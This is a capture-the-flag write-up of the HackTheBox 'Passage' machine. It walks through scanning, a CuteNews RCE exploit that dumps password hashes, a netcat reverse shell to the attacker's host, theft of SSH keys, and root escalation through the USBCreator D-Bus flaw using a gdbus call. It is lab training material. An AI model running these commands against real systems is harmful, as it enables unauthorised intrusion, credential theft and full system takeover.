# Passage | HackTheBox

### 1. Scan
```bash
kali@kali:~/Desktop/htb/passage$ sudo nmap -A -p- -T4 10.10.10.206
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-18 03:58 EDT
Warning: 10.10.10.206 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.206
Host is up (0.36s latency).
Not shown: 65476 closed ports, 57 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=9/18%OT=22%CT=1%CU=44496%PV=Y%DS=2%DC=T%G=Y%TM=5F646D9
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=A)SEQ
OS:(SP=106%GCD=1%ISR=108%TI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54
OS:DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%
OS:W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   416.65 ms 10.10.14.1
2   416.80 ms 10.10.10.206

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1246.39 seconds
```
The machine is just running an Apache server on port 80 and SSH on port 22.

### 2. Look at the website
The website is a simple news page with some stories. Most of them appear to be samples except for the first one which is about how Fail2Ban has been implemented on the machine to counter excessive traffic. There doesn't appear to be anything else of note in any other story.  
Also of note is the id parameter which is used to link each news story. Supplying a random number such as 8888 to this parameter returns the error: "Cannot find an article with id: 8888". Supplying a single quote results in an internal error. This seems like a potential pathway for SQL injection (Spoiler: I manage to get a foothold without using this however).  
Taking note of the users posting comments, there are 4 users:
- admin (nadav@passage.htb)
- Sid Meier (sid@passage.htb)
- Paul Coles (paul@passage.htb)
- Kim Swift (kim@passage.htb)
- James (james@passage.htb)
  
Down the bottom of the page is "Powered by CuteNews" which is the PHP application on which the site is built on. By reading the source further, I find the login page for the CMS at http://passage.htb/CuteNews/. This also gives me the application version - 2.1.2, for which there is a RCE vulnerability present - https://nvd.nist.gov/vuln/detail/CVE-2019-11447. Luckily, it is possible to create a user via the page: http://passage.htb/CuteNews/index.php?register  
I try this out and it allows me to make a user account.

### 3. Get a foothold
Using the exploit at https://www.exploit-db.com/exploits/48800 (see cutenews212exp.py) I can dump hashes and drop into a shell.
```bash
kali@kali:~/Desktop/htb/passage$ python3 cutenews212exp.py 



           _____     __      _  __                     ___   ___  ___ 
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/ 
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/ 
                                ___  _________                        
                               / _ \/ ___/ __/                        
                              / , _/ /__/ _/                          
                             /_/|_|\___/___/                          
                                                                      

                                                                                                                                                   

[->] Usage python3 expoit.py

Enter the URL> http://passage.htb/
================================================================
Users SHA-256 HASHES TRY CRACKINGTHEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: QuaX05Ibpj and password: QuaX05Ibpj

=======================================================
Sending Payload
=======================================================
signature_key: 6877041cdd79ccc9ef97656f310fb0e8-QuaX05Ibpj
signature_dsi: 29f8c6ac8219513e7e4878ca0598f115
logged in user: QuaX05Ibpj
============================
Dropping to a SHELL
============================

command > whoami 
www-data
```
The shell is cool and I also get some SHA256 password hashes.

### 4. Crack hashes
Using crackstation I can get two passwords out:
1. e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
2. 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc:egre55  
One of these passwords will be for a user account hopefully. The other passwords are unable to be cracked with hashcat.  
  
Because I found five users on the forum, and there are 5 hashes, I can maybe assume that I now have a list of good usernames and their password hashes. However, none of the user names are valid for the login page, so the naming convention for users must be different over what is displayed. To get more information on this I go enumerating on the web server through the webshell and find the following directory with various php files. Although I am denied access to the content, the base64'd data that accompanies the error message tells me the naming convention that is used.
```bash
command > ls -la ../cdata/users      
total 184
drwxrwxrwx  2 www-data www-data 4096 Sep 23 00:13 .
drwxrwxrwx 11 www-data www-data 4096 Sep 23 00:01 ..
-rw-r--r--  1 www-data www-data  653 Sep 22 21:57 01.php
-rw-r--r--  1 www-data www-data  153 Sep 23 00:10 04.php
-rw-r--r--  1 www-data www-data  293 Sep 23 00:10 09.php
-rw-r--r--  1 www-data www-data  109 Aug 30 16:23 0a.php
-rw-r--r--  1 www-data www-data  125 Aug 30 16:23 16.php
-rw-r--r--  1 www-data www-data  113 Sep 22 21:15 1d.php
-rw-r--r--  1 www-data www-data  609 Sep 23 00:01 1f.php
-rwxr-xr-x  1 www-data www-data  437 Jun 18 09:50 21.php
-rw-r--r--  1 www-data www-data  133 Sep 22 23:59 23.php
-rw-r--r--  1 www-data www-data  133 Sep 23 00:09 25.php
-rw-r--r--  1 www-data www-data  585 Sep 23 00:13 28.php
-rw-r--r--  1 www-data www-data  109 Aug 31 14:54 32.php
-rw-r--r--  1 www-data www-data  157 Sep 23 00:10 3e.php
-rw-r--r--  1 www-data www-data  137 Sep 22 23:29 41.php
-rw-r--r--  1 www-data www-data  137 Sep 22 23:31 43.php
-rw-r--r--  1 www-data www-data  109 Sep 22 23:59 46.php
-rw-r--r--  1 www-data www-data  117 Sep 23 00:01 4e.php
-rwxr-xr-x  1 www-data www-data  113 Jun 18 08:28 52.php
-rw-r--r--  1 www-data www-data  229 Sep 23 00:10 5d.php
-rwxr-xr-x  1 www-data www-data  129 Jun 18 08:28 66.php
-rw-r--r--  1 www-data www-data  201 Sep 22 23:57 6c.php
-rw-r--r--  1 www-data www-data  133 Aug 31 14:54 6e.php
-rwxr-xr-x  1 www-data www-data  117 Jun 18 08:27 77.php
-rwxr-xr-x  1 www-data www-data  481 Jun 18 09:07 7a.php
-rw-r--r--  1 www-data www-data  105 Sep 22 23:57 82.php
-rw-r--r--  1 www-data www-data  133 Sep 22 21:15 8b.php
-rwxr-xr-x  1 www-data www-data  109 Jun 18 08:24 8f.php
-rw-r--r--  1 www-data www-data  229 Sep 23 00:10 97.php
-rw-r--r--  1 www-data www-data  137 Sep 22 23:24 9c.php
-rw-r--r--  1 www-data www-data  137 Sep 23 00:01 aa.php
-rwxr-xr-x  1 www-data www-data  489 Jun 18 09:05 b0.php
-rw-r--r--  1 www-data www-data  137 Sep 22 23:29 b4.php
-rw-r--r--  1 www-data www-data  137 Sep 22 23:29 b8.php
-rwxr-xr-x  1 www-data www-data  481 Jun 18 09:46 c8.php
-rw-r--r--  1 www-data www-data  117 Sep 22 23:31 c9.php
-rwxr-xr-x  1 www-data www-data   45 Jun 18 08:26 d4.php
-rwxr-xr-x  1 www-data www-data   45 Jun 18 09:08 d5.php
-rw-r--r--  1 www-data www-data 1213 Aug 31 14:55 d6.php
-rw-r--r--  1 www-data www-data  621 Sep 22 23:58 d7.php
-rw-r--r--  1 www-data www-data  609 Sep 22 23:31 d8.php
-rw-r--r--  1 www-data www-data   45 Sep 22 23:48 f4.php
-rw-r--r--  1 www-data www-data  137 Sep 22 23:29 fb.php
-rwxr-xr-x  1 www-data www-data  113 Jun 18 08:28 fc.php
-rw-r--r--  1 www-data www-data 3840 Aug 30 17:54 lines
-rw-r--r--  1 www-data www-data    0 Jun 18 08:24 users.txt

command > cat ../cdata/users/fc.php
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzMwOTtzOjk6ImtpbS1zd2lmdCI7fX0=
```
The above base64 decodes to:
a:1:{s:2:"id";a:1:{i:1592483309;s:9:"kim-swift";}}

### 5. Access an account
Using Burp intruder with cluster bomb attack mode I enumerate though all usernames in the new naming convention and finally hit a valid account: `paul-coles:atlanta1`.
The account has some file-upload functionality, but it is stuck within the uploads folder. I can also try and access SSH - unfortunately it fails as I have no valid SSH key. However I can try switching from www-data to the paul's account using su. Firstly I use nc from the webshell to get a real shell.
```bash
command > which nc
/bin/nc

command > which bash 
/bin/bash

command > nc -e /bin/bash 10.10.15.158 9999
```
Get the shell and switch users.
```bash
kali@kali:~$ nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.10.206 59812
which python
/usr/bin/python
which python3
/usr/bin/python3
python3 -c "import pty; pty.spawn('/bin/bash');"
www-data@passage:/var/www/html/CuteNews/uploads$ su - paul
su - paul
Password: atlanta1

paul@passage:~$
```

### 6. Enumerate from user
To make things easier from here I swipe paul's private key and SSH into the account.
```bash
kali@kali:~/Desktop/htb/passage$ ssh -i paul_id_rsa paul@passage.htb
load pubkey "paul_id_rsa": invalid format
Last login: Wed Sep 23 00:04:38 2020 from 10.10.14.146
paul@passage:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  user.txt  Videos
paul@passage:~$ whoami
paul
paul@passage:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
```
nadav is also a user on the machine.  
I wget and run some enumeration scripts (see linenum_out.txt). One thing I get out of this is seeing that nadav has some nice privs:
```bash
[-] It looks like we have some admin users:
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```
Look everywhere in the user directory:
```bash
paul@passage:~$ ls -Rahl
.:
total 116K
drwxr-x--- 17 paul paul 4.0K Sep 23 01:00 .
drwxr-xr-x  4 root root 4.0K Jul 21 10:43 ..
----------  1 paul paul    0 Jul 21 10:44 .bash_history
-rw-r--r--  1 paul paul  220 Aug 31  2015 .bash_logout
-rw-r--r--  1 paul paul 3.7K Jul 21 10:44 .bashrc
drwx------ 10 paul paul 4.0K Sep  1 02:10 .cache
drwx------ 14 paul paul 4.0K Aug 24 07:12 .config
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:44 Desktop
-rw-r--r--  1 paul paul   25 Aug 24 07:11 .dmrc
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:44 Documents
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:44 Downloads
-rw-r--r--  1 paul paul 8.8K Apr 20  2016 examples.desktop
drwx------  2 paul paul 4.0K Aug 24 07:13 .gconf
drwx------  3 paul paul 4.0K Sep  2 07:19 .gnupg
-rw-------  1 paul paul 1.3K Sep  2 07:18 .ICEauthority
drwx------  3 paul paul 4.0K Aug 24 07:11 .local
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:44 Music
drwxrwxr-x  2 paul paul 4.0K Sep 23 01:00 .nano
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:44 Pictures
-rw-r--r--  1 paul paul  655 May 16  2017 .profile
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:44 Public
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:43 .ssh
drwxr-xr-x  2 paul paul 4.0K Sep 23 01:03 Templates
-r--------  1 paul paul   33 Sep 22 21:18 user.txt
drwxr-xr-x  2 paul paul 4.0K Jul 21 10:44 Videos
-rw-------  1 paul paul   52 Sep  2 07:18 .Xauthority
						  -rw-------  1 paul paul 1.2K Sep  2 07:19 .xsession-errors
-rw-------  1 paul paul 1.4K Sep  1 04:20 .xsession-errors.old
...
```
Checking out the authorized keys file:
```bash
paul@passage:~$ cat .ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
```
The public key associated with this SSH account actually belongs to the user nadav. Therefore I should be able to access nadav's account as well.

### 6. Switch users and continue enumeration

```bash
kali@kali:~/Desktop/htb/passage$ ssh -i paul_id_rsa nadav@passage.htb
load pubkey "paul_id_rsa": invalid format
Last login: Thu Sep 24 00:33:42 2020 from 10.10.15.158
nadav@passage:~$ whoami
nadav
```
While enumerating this user I spawn a meterpreter shell to play around with some post modules. One of them, enum_users_history, dumps out nadav's VIM editing history.
```bash
msf5 post(linux/gather/enum_users_history) > run

[+] Info:
[+]     Ubuntu 16.04.6 LTS  
[+]     Linux passage 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
[-] Failed to open file: /home/nadav/.ash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/nadav/.bash_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/nadav/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/nadav/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/nadav/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/nadav/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/nadav/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/nadav/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/nadav/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/nadav/.dbshell: core_channel_open: Operation failed: 1
[+] Vim history for nadav stored in /root/.msf4/loot/20200924032855_default_10.10.10.206_linux.enum.users_758355.txt
[-] Failed to open file: /etc/sudoers: core_channel_open: Operation failed: 1
[+] Last logs stored in /root/.msf4/loot/20200924032859_default_10.10.10.206_linux.enum.users_692812.txt
[*] Post module execution completed
msf5 post(linux/gather/enum_users_history) > cat /root/.msf4/loot/20200924032855_default_10.10.10.206_linux.enum.users_758355.txt
[*] exec: cat /root/.msf4/loot/20200924032855_default_10.10.10.206_linux.enum.users_758355.txt

# This viminfo file was generated by Vim 7.4.
# You may edit it if you're careful!

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&AdminIdentities=unix-group:root

# Last Substitute String:
$AdminIdentities=unix-group:sudo

# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g

# Search String History (newest to oldest):
? AdminIdentities=unix-group:root

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:

# File marks:
'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-'  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

> /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
        "       12      7

> /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
        "       2       0
        .       2       0
        +       2       0
```
Checking out the files in which the changes were made:
```bash
meterpreter > shell
Process 2310 created.
Channel 21 created.
cat com.ubuntu.USBCreator.conf
<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
<busconfig>

  <!-- Only root can own the service -->
  <policy user="root">
    <allow own="com.ubuntu.USBCreator"/>
  </policy>

  <!-- Allow anyone to invoke methods (further constrained by
       PolicyKit privileges -->
  <policy context="default">
    <allow send_destination="com.ubuntu.USBCreator" 
           send_interface="com.ubuntu.USBCreator"/>
    <allow send_destination="com.ubuntu.USBCreator" 
           send_interface="org.freedesktop.DBus.Introspectable"/>
    <allow send_destination="com.ubuntu.USBCreator" 
           send_interface="org.freedesktop.DBus.Properties"/>
  </policy>

</busconfig>

cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin
```
Only root has write permission for these files. I start researching and find a recent article published about using USBCreator D-Bus to escalate to root: https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/. Most importantly it seems I do not need to know nadav's credentials (which I don't know) to do it. Essentially by taking advantage of unsantitized input being given to a privileged process we can perform arbritary actions as the privileged user, in this case root.  
The usb-creator-helper process is indeed running as root.
```bash
nadav@passage:~$ ps -aux | grep usb
nadav     43693  0.0  0.0  21292   936 pts/25   S+   18:33   0:00 grep --color=auto usb
root      95338  0.0  0.4 235528 19828 ?        Sl   07:56   0:00 /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper
```
Just like what is explained in the reference, a polkit query is used to determine authorization. Unfortunately I can't follow any further than this because the polkit configuration is read-only for root. However, I can hope that dd is implemented in the same way with no input sanitization and just see what happens.

### 7. Escalate to root
Given that the consequence of this vulnerability is a means to write files to arbritary locations as root, the first thing to try is writing the paul user's SSH public key to root's .ssh/authorized_keys file.
```bash
nadav@passage:/tmp/.novisibleexploitstuff$ cp ~/.ssh/authorized_keys . && gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator  --method com.ubuntu.USBCreator.Image $(pwd)/authorized_keys /root/.ssh/authorized_keys true
()
```
Then I can login as root over SSH.
```bash
kali@kali:~/Desktop/htb/passage$ ssh -i paul_id_rsa root@passage.htb
load pubkey "paul_id_rsa": invalid format
Last login: Thu Sep 24 07:58:09 2020 from 10.10.15.29
root@passage:~# whoami
root
```
